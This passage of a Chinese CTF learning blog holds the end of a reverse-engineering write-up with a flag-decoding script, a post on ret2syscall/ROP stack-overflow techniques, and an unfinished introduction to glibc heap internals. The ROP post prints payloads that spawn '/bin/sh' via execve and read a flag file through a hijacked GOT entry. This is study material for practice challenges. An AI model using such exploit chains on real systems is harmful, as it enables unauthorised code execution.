class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">12</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">203</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">13</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">13</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">204</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">14</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">14</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">205</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">15</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">15</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">206</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">16</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">16</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">207</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">17</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">17</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">208</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">18</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">18</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">209</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">19</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">19</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">210</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">20</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">20</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">211</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">21</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">21</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">212</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">22</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">22</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">213</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">23</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">23</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">214</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">24</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">24</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">215</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">25</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">25</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">216</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">26</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">26</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">217</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">27</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">27</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">218</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">28</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">28</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">219</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">29</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">29</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">220</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">30</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">30</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">221</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">31</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">31</span>] = (byte) memory[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>其实就能看出来运算了，给出脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cipher = [ <span class="number">94</span>, <span class="number">106</span>, <span class="number">91</span>, <span class="number">110</span>, <span class="number">86</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">20</span>, <span class="number">32</span>, <span class="number">20</span>, <span class="number">80</span>, <span class="number">21</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">88</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">19</span>, <span class="number">79</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">117</span>, <span class="number">68</span>, <span class="number">120</span>, <span class="number">61</span>, <span class="number">13</span>, <span class="number">75</span>, <span class="number">115</span>, <span class="number">48</span>, <span class="number">8</span>, <span class="number">76</span>, <span class="number">123</span> ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">or</span> i == <span class="number">31</span>:</span><br><span class="line">		cipher[i] += <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		cipher[i] -= <span class="number">1</span></span><br><span class="line">	cipher[i] &amp;= <span class="number">0xFF</span></span><br><span class="line">	cipher[i] ^= cipher[i - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">cipher[<span class="number">0</span>] = (cipher[<span class="number">0</span>] + <span class="number">1</span>) ^ <span class="number">30</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, cipher))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>得到flag：A766957A53EDA9290CCF8E03F1A9B7E0</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://jonathanbest7.github.io/2023/03/23/ret2xxx/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/bitbug_favicon.ico">
      <meta itemprop="name" content="bj777">
      <meta itemprop="description" content="一位逆向菜狗">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="bj777的blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/23/ret2xxx/" class="post-title-link" itemprop="url">ret2xxx</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-23 10:50:54 / 修改时间：11:29:59" itemprop="dateCreated datePublished" datetime="2023-03-23T10:50:54+08:00">2023-03-23</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2xx"><a href="#ret2xx" class="headerlink" title="ret2xx"></a>ret2xx</h1><p>这两周做了很多栈溢出的题，这是很基础的东西，所以想写一下做一个归类。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>系统调用怎么写：首先，如果要在rop链中用系统调用，要知道32位和64位区别：</p>
<p>1.传参方式不同</p>
<p>2.系统调用号不同</p>
<p>3.调用方式不同</p>
<p>32位传参方式：</p>
<p>系统调用号存在eax，参数依次放在ebx,ecx,edx,esi,edi,ebp，返回值存到eax</p>
<p>调用号：sys_read的调用号为3，sys_write的调用号为4，sys_execve的调用号为11 </p>
<p>调用方式：使用int 0x80软中端指令进行系统调用</p>
<p>64位传参方式：<br>系统调用号放在rax，参数依次放在rdi,rsi,rdx,r10,r8,r9,返回值存在rax</p>
<p>（和普通函数调用仅仅在第四个参数那不同，普通的函数是参数放入rcx）</p>
<p>调用号：sys_read的调用号为0，sys_write的调用号为1，sys_execve的调用号为59 </p>
<p>调用方式：使用syscall函数进行系统调用</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230323111008911.png" alt="image-20230323111008911"></p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230323111035012.png" alt="image-20230323111035012"></p>
<p>举例：32位：ret2syscall，如何调用以下函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, pop_eax, <span class="number">0xb</span>, pop_edx_ecx_ebx, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br></pre></td></tr></table></figure>

<p>先将系统调用号存到eax，再将参数传入ebx，ecx，edx，最后执行0x80软中断</p>
<p>64位：如何调用以下函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;flag&quot;</span>, O_RDONLY)</span><br><span class="line">read(fd, bss+<span class="number">0x100</span>, <span class="number">0x50</span>)</span><br><span class="line"><span class="built_in">printf</span>(bss_addr+<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload += b<span class="string">&#x27;a&#x27;</span>*<span class="number">0</span>x<span class="number">38</span> + p<span class="number">64</span><span class="comment">(pop_rdi_ret)</span> + p<span class="number">64</span><span class="comment">(alarm_got)</span> +p<span class="number">64</span><span class="comment">(pop_rax_ret)</span> + p<span class="number">64</span><span class="comment">(syscall_offset)</span> + p<span class="number">64</span><span class="comment">(add_rdi_al_ret)</span></span><br><span class="line"><span class="attr"># open(&quot;flag&quot;, O_RDONLY)</span></span><br><span class="line"><span class="attr">payload += p64</span><span class="comment">(pop_rsi_pop_r15_ret)</span> + p<span class="number">64</span><span class="comment">(O_RDONLY)</span> + b<span class="string">&#x27;deadbeef&#x27;</span> + p<span class="number">64</span><span class="comment">(pop_rdi_ret)</span> + p<span class="number">64</span><span class="comment">(flag_addr)</span> + p<span class="number">64</span><span class="comment">(pop_rax_ret)</span> + p<span class="number">64</span><span class="comment">(n_sys_open)</span> + p<span class="number">64</span><span class="comment">(alarm_plt)</span></span><br><span class="line"><span class="attr"># read(fd, bss_addr+0</span>x<span class="number">100</span>, <span class="number">0</span>x<span class="number">50</span>)</span><br><span class="line">payload += p<span class="number">64</span><span class="comment">(pop_rdx_ret)</span> + p<span class="number">64</span><span class="comment">(0x50)</span> + p<span class="number">64</span><span class="comment">(pop_rsi_pop_r15_ret)</span> + p<span class="number">64</span><span class="comment">(bss_addr+0x100)</span> + b<span class="string">&#x27;deadbeef&#x27;</span> + p<span class="number">64</span><span class="comment">(pop_rdi_ret)</span> + p<span class="number">64</span><span class="comment">(fd)</span> + p<span class="number">64</span><span class="comment">(read_plt)</span>    </span><br><span class="line"><span class="attr"># printf(bss_addr+0</span>x<span class="number">100</span>)</span><br><span class="line">payload += p<span class="number">64</span><span class="comment">(pop_rdi_ret)</span> + p<span class="number">64</span><span class="comment">(bss_addr+0x100)</span> + p<span class="number">64</span><span class="comment">(printf_plt)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先rdi存某个系统调用的got地址，再用rax存syscall相对于alarm这个系统调用的偏移地址，接下来用add将got中alarm地址+偏移就是syscall地址覆盖alarm的got地址，所以该地址变成了syscall，rdi存的就是syscall地址，接下来rsi存入open的第一个参数，r15存入垃圾数据，然后rdi存flag字符串地址，rax存open的调用号，最后用syscall来调用这个rop（改alarm的got，调用函数需要用plt）</p>
<p>read函数本来就在程序中用过，所以不用执行系统调用。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://jonathanbest7.github.io/2023/03/20/pwn2heap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/bitbug_favicon.ico">
      <meta itemprop="name" content="bj777">
      <meta itemprop="description" content="一位逆向菜狗">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="bj777的blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/20/pwn2heap/" class="post-title-link" itemprop="url">pwn2heap</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-03-20 16:11:46" itemprop="dateCreated datePublished" datetime="2023-03-20T16:11:46+08:00">2023-03-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-04-04 11:18:11" itemprop="dateModified" datetime="2023-04-04T11:18:11+08:00">2023-04-04</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="pwn2heap"><a href="#pwn2heap" class="headerlink" title="pwn2heap"></a>pwn2heap</h1><h2 id="堆的基础知识"><a href="#堆的基础知识" class="headerlink" title="堆的基础知识"></a>堆的基础知识</h2><p>我们现在在学的是在glibc下的堆–ptmalloc2。堆是由低地址向高地址增长的，管理堆的称为对管理器。</p>
<p>malloc调用底层原理，malloc通过创建堆的大小来选择，下图很经典:</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230328191402830.png" alt="image-20230328191402830"></p>
<p>通过brk申请内存，初始状态start_brk和brk指向同一地址，aslr开启会有不同效果</p>
<ul>
<li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data&#x2F;bss 段的结尾。</li>
<li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data&#x2F;bss 段结尾后的随机偏移处。</li>
</ul>
<p>通过mmap申请内存，用来申请大的空间。</p>
<p>我们如果申请1000字节内存，但会得到很大的堆，是因为系统要向内核请示，这样会消耗许多系统资源，所以直接给一个很大的内存可以避免多次用户态和内核态切换，这段连续内存叫arena</p>
<h2 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>由malloc申请的内存叫chunk，这块内存在ptmalloc内部用malloc_chunk结构体表示，无论chunk大小如何，处于分配还是释放状态，都有统一结构。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p> INTERNAL_SIZE_T 就是size_t 是无符号整数</p>
<p>prev_size：如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个chunck的大小（包括chunk头），否则该字段可以用来存储物理地址相邻的前一个chunk数据，前一个chunk指的是低地址的chunk。</p>
<p>size：指当前chunck大小，必须是4或8的倍数，因为机子要么是32位要么是64位，地址必须要遵守上述规定，所以其2进制后三位一定为0，所以我们给他新的应用，从高往低依次表示：</p>
<ul>
<li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
<li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li>
<li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并（如果前面的chunk没有free，该位为1）。</li>
</ul>
<p>fd，bk：chunk在分配状态时，fd字段开始是用户数据。chunk空闲时，会被添加到对应空闲管理链表中：</p>
<ul>
<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>
</ul>
<p>fd_nextsize，bk_nextsize：用于较大的chunk，用于空闲的chunk</p>
<ul>
<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li>
</ul>
<p>一个已经分配的 chunk 的样子如下。<strong>我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。</strong>（分配的内存地址和malloc赋予的指针地址其实不一样）</p>
<p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="type">Size</span> of previous chunk, <span class="keyword">if</span> unallocated (P <span class="built_in">clear</span>)  |</span><br><span class="line">        <span class="type">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="type">        |             Size</span> of chunk, <span class="built_in">in</span> bytes                     |<span class="type">A</span>|<span class="type">M</span>|<span class="type">P</span>|</span><br><span class="line">  <span class="type">mem</span>-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="type">User</span> data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line"><span class="type">chunk</span>-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="type">(size</span> of chunk, but used <span class="keyword">for</span> application data)    |</span><br><span class="line">        <span class="type">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="type">        |             Size</span> of next chunk, <span class="built_in">in</span> bytes                |<span class="type">A</span>|<span class="type">0</span>|<span class="type">1</span>|</span><br><span class="line">        <span class="type">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br></pre></td></tr></table></figure>

<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>被释放的堆并不会立刻消失，会由ptmalloc堆管理器管理，为了是当又需要chunk时能够立刻挑选一个合适的给用户。空闲的chunk会被分为4类：fast bins，small bins，large bins，unsorted bin。ptmalloc将这些维护在一个数组中，存放在malloc_state中</p>
<p>数组中的 bin 依次如下</p>
<ol>
<li>第一个为 unsorted bin，字如其面，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。</li>
<li>索引从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 <strong>2 个机器字长</strong>，即 32 位相差 8 字节，64 位相差 16 字节。</li>
<li>small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。</li>
</ol>
<p>此外，上述这些 bin 的排布都会遵循一个原则：<strong>任意两个物理相邻的空闲 chunk 不能在一起</strong>。</p>
<p>需要注意的是，并不是所有的 chunk 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的 chunk <strong>先</strong>放到 fast bins 的容器内。<strong>而且，fastbin 容器中的 chunk 的使用标记总是被置位的，所以不满足上面的原则。</strong></p>
<h4 id="fastbin（lifo）"><a href="#fastbin（lifo）" class="headerlink" title="fastbin（lifo）"></a>fastbin（lifo）</h4><p>为了不把时间花在合并和拆分堆内存上，fastbin被设计出来，glibc对fastbin中的每个bin进行单向链表组织，fastbin最大chunk空间是80字节，当需要小于80字节时，会先在fastbin里寻找有对应大小的空闲块。</p>
<h4 id="smallbin（fifo）"><a href="#smallbin（fifo）" class="headerlink" title="smallbin（fifo）"></a>smallbin（fifo）</h4><p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230328203217271.png" alt="image-20230328203217271"></p>
<p>smallbin是双向链表，共62个，每个链表存储chunk大小都一样。比如32位系统下标2对应链表chunk大小都是16字节</p>
<h4 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h4><p>一共有63个bin，每个bin中chunk大小不同，处于一定区间范围内，这63个bin被分成6组，每组bin中chunk大小一致</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230328203741130.png" alt="image-20230328203741130"></p>
<h4 id="unsortedbin（fifio）"><a href="#unsortedbin（fifio）" class="headerlink" title="unsortedbin（fifio）"></a>unsortedbin（fifio）</h4><p>是空闲chunk回归所属bin之前的缓冲区，unsortedbin只有一个链表，chunk处于乱序状态</p>
<ul>
